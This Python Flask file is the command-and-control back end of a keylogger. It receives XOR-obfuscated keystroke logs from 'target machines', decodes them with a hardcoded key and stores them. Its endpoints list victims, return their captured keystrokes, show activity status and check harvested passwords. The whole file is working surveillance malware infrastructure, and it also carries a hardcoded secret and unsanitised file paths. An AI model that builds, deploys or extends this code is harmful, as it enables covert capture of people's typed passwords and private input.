import os
from datetime import datetime
from flask import Flask, jsonify, request, json
from flask_cors import CORS
import time
from dotenv import load_dotenv

# Define the folder where data will be stored
DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")


def generate_log_filename():
    """
    Generate a log filename based on the current date.

    Returns:
        str: The generated log filename in the format 'log_YYYY-MM-DD.txt'.
    """
    return "log_" + time.strftime("%Y-%m-%d") + ".txt"


# Initialize the Flask application
app = Flask('app')
# Enable Cross-Origin Resource Sharing (CORS) for the app
CORS(app)


@app.route('/api/upload', methods=['POST'])
def upload():
    """
    Handle the upload of log data for a specific machine.

    Expects a JSON payload with 'machine' and 'data' fields.
    Decrypts the data and appends it to a log file for the specified machine.

    Returns:
        Response: JSON response indicating success or failure.
    """
    data = request.get_json()
    print(data)

    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    load_dotenv(
        dotenv_path=os.path.join(os.path.dirname(__file__), '..', '.env'))  # Load environment variables from .env file
    key = os.getenv("KEY_ENCRYPTION")
    log_data_decrypted = decrypt("secretkey1", data["data"])
    print(f"Decrypted data: {log_data_decrypted}")

    machine_folder = os.path.join(DATA_FOLDER, next(iter(machine)))
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    new_entry = {
        "timestamp": timestamp,
        "data": log_data_decrypted
    }

    # Read existing data if the file exists
    existing_data = []
    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
        with open(file_path, "r", encoding="utf-8") as f:
            try:
                existing_data = json.load(f)  # Load JSON list
            except json.JSONDecodeError:
                print("Error: JSON file is corrupted or empty. Resetting file.")
                existing_data = []

    # Append the new entry
    existing_data.append(new_entry)

    # Write back the full JSON list efficiently
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(existing_data, f, ensure_ascii=False, indent=4)

    return jsonify({"status": "success", "file": file_path, "data": log_data_decrypted}), 200


def decrypt(key: str, data: str):
    """
    Decrypt the given data using the provided key.

    Args:
        key (str): The decryption key.
        data (str): The data to decrypt.

    Returns:
        str: The decrypted data.
    """
    decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
    return decrypted


@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    """
    Get a list of target machines.

    Returns:
        Response: JSON response containing the list of machines.
    """
    machines = os.listdir(DATA_FOLDER)
    return jsonify({"machines": machines}), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_target_machine_key_strokes():
    """
    Get keystrokes for a specific target machine.

    Expects a 'target_machine' query parameter.

    Returns:
        Response: JSON response containing the keystrokes or an error message.
    """
    target_machine = request.args.get('target_machine')
    if not target_machine:
        return jsonify({"error": "Missing target_machine parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    files = sorted(os.listdir(machine_folder), reverse=False)  # Oldest first
    keystrokes = []

    for file in files:
        file_path = os.path.join(machine_folder, file)
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                file_data = json.load(f)  # Load the entire JSON list
                if isinstance(file_data, list):  # Ensure it's a valid list
                    keystrokes.extend(file_data)
        except json.JSONDecodeError:
            print(f"Warning: Skipping corrupted file {file_path}")

    return jsonify({"keystrokes": keystrokes}), 200


@app.route('/api/check_passwords', methods=['POST'])
def check_passwords():
    """
    Check if the provided passwords exist in the stored passwords file.

    Expects a JSON payload with 'passwords' field.

    Returns:
        Response: JSON response indicating success or failure.
    """
    data = request.get_json()
    print(data)
    passwords_file_path = os.path.join(os.path.dirname(__file__), 'passwords.json')
    if not data or "passwords" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    with open(passwords_file_path, "r", encoding="utf-8") as f:
        passwords = json.load(f)
    print(passwords)
    if data["passwords"] in passwords.values():
        return jsonify({"status": "success"}), 200
    return jsonify({"error": "Password not found"}), 404

@app.route('/api/get_machines_details', methods=['GET'])
def get_machines_details():
    """
    Get detailed information about target machines including last activity and keystroke counts.

    Returns:
        Response: JSON response containing detailed information about each machine.
    """
    if not os.path.exists(DATA_FOLDER):
        return jsonify({"machines": []}), 200
        
    machines = os.listdir(DATA_FOLDER)
    machine_details = []

    for machine in machines:
        machine_folder = os.path.join(DATA_FOLDER, machine)
        if not os.path.isdir(machine_folder):
            continue

        files = sorted(os.listdir(machine_folder), reverse=True)  # Newest first
        total_keystrokes = 0
        last_activity = None

        for file in files:
            file_path = os.path.join(machine_folder, file)
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    file_data = json.load(f)  # Load the entire JSON list
                    if isinstance(file_data, list):  # Ensure it's a valid list
                        for entry in file_data:
                            if "data" in entry:
                                total_keystrokes += len(entry["data"])
                        
                        # Get last activity from the newest file's last entry
                        if not last_activity and file_data and "timestamp" in file_data[-1]:
                            last_activity = file_data[-1]["timestamp"]
            except json.JSONDecodeError:
                print(f"Warning: Skipping corrupted file {file_path}")
            except Exception as e:
                print(f"Error processing file {file_path}: {e}")

        # Determine if the machine is active (activity in the last hour)
        is_active = False
        if last_activity:
            try:
                last_activity_time = datetime.strptime(last_activity, "%Y-%m-%d %H:%M:%S")
                time_diff = datetime.now() - last_activity_time
                is_active = time_diff.total_seconds() < 3600  # Active if activity in last hour
            except Exception as e:
                print(f"Error parsing timestamp: {e}")

        machine_details.append({
            "name": machine,
            "last_activity": last_activity,
            "total_keystrokes": total_keystrokes,
            "is_active": is_active
        })

    return jsonify({"machines": machine_details}), 200

if __name__ == '__main__':
    app.run(debug=True)
